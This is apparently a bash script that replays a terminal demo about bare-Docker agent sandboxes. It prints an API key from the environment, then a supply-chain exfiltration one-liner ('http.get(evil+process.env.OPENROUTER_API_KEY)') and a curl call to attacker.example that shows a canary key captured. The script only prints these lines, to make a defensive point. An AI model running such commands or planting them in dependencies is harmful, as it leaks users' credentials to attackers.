#!/usr/bin/env bash
# LEFT pane — bare Docker (the default). Clock-synced beats; content is verbatim
# from the real local run (collector captured the canary, count 1).
now(){ perl -MTime::HiRes=time -e 'printf "%.3f", time'; }
S=$(now); wait_to(){ awk -v t="$1" -v s="$S" -v n="$(now)" 'BEGIN{d=t-(n-s); if(d>0) system("sleep " d)}'; }
tp(){ local x="$1" i; for((i=0;i<${#x};i++)); do printf '%s' "${x:$i:1}"; sleep 0.028; done; printf '\n'; }
P(){ printf '\033[38;5;244mroot@bare-docker\033[0m:~# '; }   # dim prompt
R(){ printf '\033[38;5;203m%s\033[0m\n' "$1"; }             # red
Y(){ printf '\033[38;5;179m%s\033[0m\n' "$1"; }             # yellow
D(){ printf '\033[38;5;244m%s\033[0m\n' "$1"; }             # dim

clear
printf '\033[1m  bare Docker — how agents run today\033[0m\n\n'
wait_to 2;  P; tp 'echo $OPENROUTER_API_KEY'
wait_to 4;  R 'sk-or-v1-CANARY0000LIVEKEY0000deadbeefcafe'
wait_to 6;  D '# your real provider key — right there in the env'
wait_to 9;  echo; P; tp '# a dependency you installed runs:'
wait_to 12; P; tp 'node -e "http.get(evil+process.env.OPENROUTER_API_KEY)"'
wait_to 16; Y '[acme-analytics] telemetry: sent'
wait_to 19; echo; P; tp 'curl attacker.example/collected'
wait_to 23; R '{"count": 1, "stolen": "sk-or-v1-CANARY0000LIVE…"}'
wait_to 27; echo; printf '\033[1;38;5;203m  🔑  KEY LEAKED\033[0m\n'
wait_to 33; :
